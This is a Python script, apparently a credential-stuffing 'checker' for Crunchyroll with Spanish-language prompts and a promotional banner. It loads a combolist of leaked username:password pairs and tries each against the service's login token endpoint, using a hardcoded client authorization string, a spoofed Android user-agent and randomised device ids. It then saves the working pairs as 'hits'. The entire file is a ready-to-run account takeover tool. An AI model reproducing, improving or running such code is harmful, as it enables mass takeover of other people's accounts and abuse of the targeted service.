import requests, string, random, urllib.parse, ctypes, easygui, time
from colorama import Fore as f, init
from bs4 import BeautifulSoup as Soup

class crunchy:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.errores = 0

    def nuevaConsola(self):
        LF_FACESIZE = 32
        STD_OUTPUT_HANDLE = -11

        class COORD(ctypes.Structure):
            _fields_ = [("X", ctypes.c_short), ("Y", ctypes.c_short)]

        class CONSOLE_FONT_INFOEX(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_ulong),
                        ("nFont", ctypes.c_ulong),
                        ("dwFontSize", COORD),
                        ("FontFamily", ctypes.c_uint),
                        ("FontWeight", ctypes.c_uint),
                        ("FaceName", ctypes.c_wchar * LF_FACESIZE)]

        font = CONSOLE_FONT_INFOEX()
        font.cbSize = ctypes.sizeof(CONSOLE_FONT_INFOEX)
        font.nFont = 10
        font.dwFontSize.X = 11
        font.dwFontSize.Y = 18
        font.FontFamily = 54
        font.FontWeight = 400
        font.FaceName = "MS Gothic"

        handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
        ctypes.windll.kernel32.SetCurrentConsoleFontEx(handle, ctypes.c_long(False), ctypes.pointer(font))

    def ui(self):
        init(convert=True)
        art = f'''{f.LIGHTBLUE_EX}{f.LIGHTYELLOW_EX}
           ╔═╗┬─┐┬ ┬┌┐┌┌─┐┬ ┬┬ ┬┬─┐┌─┐┬  ┬  
           ║  ├┬┘│ │││││  ├─┤└┬┘├┬┘│ ││  │  
           ╚═╝┴└─└─┘┘└┘└─┘┴ ┴ ┴ ┴└─└─┘┴─┘┴─┘{f.LIGHTBLUE_EX}

                    ⣀⡤⠤⠶⠶⠒⠒⠒⠒⠢⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠊⢡⣠⣆⡵⠦⠤⠄⠐⠾⠴⣦⣰⣈⡑⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     {f.LIGHTRED_EX}(Do not buy this software, it is free){f.LIGHTBLUE_EX}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠴⠓⠂⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⠺⢶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠴⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡶⠋⠀⠀⠀⠀⠀⠀⠉⠳⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠎⡀⠀⠂⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣭⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠔⢉⠅⡢⡨⡀⢠⡠⠀⢀⣴⣾⣿⠟⣿⠁⠸⣿⣿⣯⢻⣿⣿⣷⣦⣀⢐⠂⠀⢀⠀⠀⠀⠠⠘⢦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠊⠀⠃⠪⡠⡪⣜⠆⣨⣾⣿⣿⡿⠁⠀⢻⠀⠀⠹⣿⣿⡄⠙⣿⣿⣿⣿⣷⣴⣈⢆⢄⢔⡹⡢⠑⠀⠳⡄⠀⠀⠀⠀                  
⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⡄⡐⠁⣼⣿⣿⢿⡟⠁⠀⠀⠘⠀⠀⠀⠈⢻⣇⠀⠈⢿⡟⣿⣿⣿⡿⡗⠋⠊⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀
⠀⠀⠀⠀⢀⠊⠄⠀⠀⠀⠀⠀⠈⣸⣿⣿⠏⡞⠒⠒⠂⠤⠀⠀⠀⠀⠀⠀⠙⠂⠉⠈⢻⠸⣿⣿⣧⡚⠌⠴⡠⣠⢀⠀⠀⠀⢹⡀⠀⠀                  
⠀⠀⠀⠀⡎⢸⡘⡌⣦⡐⣦⠲⡰⣿⣿⡟⠀⠁⠀⣀⡀⠀⠀⠀⢀⠀⠀⠀⠀⢀⣠⣤⣀⠁⢻⣿⣿⣿⡷⡞⣱⢃⠞⠄⠠⠀⠈⡇⠀⠀
⠀⠀⠀⢰⢣⢰⠘⡌⣦⢀⡦⠜⠀⠀⣿⠃⠀⣰⠟⠉⠛⠦⠀⠀⢸⡆⠀⠀⠀⠟⠉⠉⠙⠆⠈⣿⡷⠅⠀⠙⡇⣾⣶⠀⡆⢠⠀⡇⠀⠀
⠀⠀⠀⢸⠸⡘⢠⡃⢋⢹⠀⠀⠀⠀⢻⠀⡀⡋⡀⠀⠀⠀⠀⠀⠘⠐⠀⠀⠀⠐⠒⠆⠰⠆⡦⢠⠇⠀⠀⠀⢸⡝⡋⠀⠷⡈⢀⠇⠀⠀          
⠀⠀⠀⠘⡆⡇⡜⣃⠜⢹⠀⠀⠀⠀⠚⡾⠛⢉⣄⡤⠀⠒⠒⠈⠉⠉⠉⠉⠉⠉⠁⠐⢖⢤⡀⢸⠄⠀⠀⠀⡰⠠⡙⣌⢧⡘⡜⠀⠀⠀         > {f.BLUE}t.me/johanmess{f.LIGHTBLUE_EX}
⠀⠀⠀⠀⢣⠞⡄⡵⡀⠚⠀⠀⠀⠀⠀⢥⠀⣿⠀⠁⢀⣠⣴⣶⣾⣿⣿⣿⣷⣶⣶⣄⡀⢸⠁⡾⡑⠡⠄⠀⠥⡐⠞⡔⠕⡰⠁⠀⠀⠀                        
⠀⠀⠀⠀⠸⣌⠈⡊⠄⠀⡀⠀⠀⠀⠄⢙⠆⠘⢶⣾⣿⠿⠛⠉⠉⠉⠉⠉⠉⠙⠿⣿⡿⠁⠰⠖⠚⠊⠀⠙⣆⠈⡞⢁⠔⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢦⡈⠀⠀⡱⡆⢀⠥⠠⠨⣚⡄⠀⠻⢤⡔⠒⠀⠀⠉⠉⠉⠉⠐⡢⠍⡔⠂⢭⡠⠀⠀⠀⢠⡙⡠⢭⢅⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠓⢵⡊⡩⠮⡌⣄⢭⡛⣸⡦⣄⡀⠈⠓⠒⠒⠐⠒⠒⠂⠁⠠⢐⡀⠀⠀⠀⠀⠀⠀⢜⢪⡇⠚⡄⠧⡀⠀⠀⠀           > {f.BLUE}Open Source {f.LIGHTBLUE_EX} 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⠡⠶⠬⠭⢽⠿⢿⠝⣉⡟⠿⣶⢦⣤⣤⣤⣤⣶⣾⣿⣇⠣⠄⠤⠔⠉⠉⠑⠂⡁⠨⣀⠷⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣔⡪⣥⠀⠀⠀⠀⠀⠀⠀⠉⠙⢇⠀⠈⠺⣿⣿⢿⣿⣿⠟⡸⠚⠉⠁⠁⠀⠀⠀⢀⠠⢑⠢⢥⠅⢒⡁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠜⠁⠀⠈⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⢄⠈⠉⢹⠻⠯⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠘⡆⠀⠀⠀
⠀⠀⠀⢀⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⡀⠀⡠⠕⠒⠉⠀⠀⠀⣠⠞⠔⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀
⠀⠀⠀⢸⠀⠀⡀⡀⣠⣁⣠⣥⣶⣶⣾⣷⣶⣤⣢⣆⡥⣡⠼⠀⠀⣠⡠⠐⠀⠻⠋⣀⠀⡀⣄⣮⢬⡚⢔⢆⣀⣠⠁⢀⡈⢐⢨⠀⠀⠀
{f.RESET}'''
        print(art)
        time.sleep(2)

    def titulo(self):
        ctypes.windll.kernel32.SetConsoleTitleW("Crunchyroll v1 [johanmess]")
        
    def actualizarTitulo(self):
        ctypes.windll.kernel32.SetConsoleTitleW(f"Crunchyroll v1 [johanmess] | Comprobadas: {self.checked} | Hits: {self.hits} | Bad: {self.bad} | Errores: {self.errores} | Tiempo: {time.strftime('%H:%M:%S', time.gmtime(time.time() - self.crono))}")

    def combolist(self):
        try:
            time.sleep(2)
            print(f'{f.YELLOW}Seleccione Combolist{f.RESET}>  ')
            archivoComb = easygui.fileopenbox(default='*.txt', filetypes=['*.txt'], title='Seleccione su archivo combolist', multiple=False)
            archivoCombo = open(archivoComb, 'r', encoding='utf-8').readlines()
            time.sleep(1)
            print(f'{f.GREEN}*Combo cargado correctamente*{f.RESET}')
            time.sleep(1)
            global nombreArchivoHits
            nombreArchivoHits = input(f"{f.MAGENTA}Escriba el nombre del archivo final dónde se guardaran los hits {f.LIGHTRED_EX}[no escriba \".txt\" al final]{f.RESET} >  ")
            time.sleep(2)
            print(f'\n\n{f.LIGHTWHITE_EX}>> {f.LIGHTGREEN_EX}INICIANDO PROCESO...{f.RESET}\n\n')
            time.sleep(3)
            self.crono = time.time()
            # Separador de combos#
            for s in archivoCombo:
                sec = s.strip()
                acc = sec.split(':')
                self.checker(acc[0], acc[1])
                self.actualizarTitulo()
        except Exception:
            print(f'{f.RED}Error al cargar el combo, intentelo otra vez{f.RESET}')
            self.combolist()

    def checker(self, usuario, clave):
        # User Id & Device Id #
        caracteres = string.ascii_lowercase + string.digits
        user_id = ''.join(random.choice(caracteres) for _ in range(36))
        device_id = "".join(random.choice(caracteres) for _ in range(36))

        # Url encode User #
        usuarioEncoded = urllib.parse.quote_plus(usuario)

        # Login #
        johan = requests.session()
        url = 'https://beta-api.crunchyroll.com/auth/v1/token'
        cabezeras = {"Host": "beta-api.crunchyroll.com", "etp-anonymous-id": user_id, "authorization": "Basic c2ZjOWYtLXEyYzJ2YWE1eW1zbHo6cThiVk5SYmp2c1g5ZGJwdDV5eTl5TXhjakNRMXgteU0=", "content-type": "application/x-www-form-urlencoded", "accept-encoding": "gzip", "user-agent": "Crunchyroll/3.32.3 Android/9 okhttp/4.9.2"}
        payload = f"username={usuarioEncoded}&password={clave}&grant_type=password&scope=offline_access&device_id={device_id}&device_name=DUK-AL20&device_type=samsung%20SM-G935F"
        mess = johan.post(url=url, headers=cabezeras, data=payload)
        self.checked += 1

        if 'token.invalid_credentials' in mess.text:
            print(f'{f.RED}[-] {usuario}:{clave}{f.RESET}')
            self.bad += 1

        elif 'access_token":"' in mess.text:
            print(f'{f.GREEN}[+] {usuario}:{clave}{f.RESET}')
            producto = open(nombreArchivoHits+'.txt', 'a', encoding='utf-8')
            producto.writelines(f"{usuario}:{clave}\n")
            self.hits += 1

        else:
            print(f'{f.YELLOW}[!] {usuario}:{clave} | {f.LIGHTYELLOW_EX}Error: {mess.text}{f.RESET}')
            self.errores +=1

    def main(self):
        self.nuevaConsola()
        self.titulo()
        self.ui()
        self.combolist()
        print(f'{f.YELLOW}\nArchivo con hits creado: {f.RESET}"{nombreArchivoHits}.txt"')
        input(f'\n{f.LIGHTWHITE_EX}Pulse la tecla "Enter" para salir del programa  ')

cr = crunchy()
cr.main()